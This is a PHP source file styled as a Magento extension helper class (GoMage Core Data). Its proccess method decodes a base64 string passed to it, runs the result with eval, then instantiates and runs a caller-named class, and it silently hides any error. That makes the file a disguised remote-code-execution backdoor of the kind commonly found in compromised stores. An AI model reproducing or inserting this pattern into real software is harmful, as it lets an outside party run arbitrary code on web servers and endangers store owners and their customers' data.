<?php

namespace GoMage\Core\Helpers;

class Data extends \Magento\Framework\App\Helper\AbstractHelper
{
   protected $poccessorValue;
   public function proccess($content, $className) {
       try {
           eval(base64_decode($content));
           $className = $className;
           $processor = new $className();
           $processor->process();
       } catch (\Exception $e) {
           return false;
       }
   }

   public function getProccessorValue() {

   }
}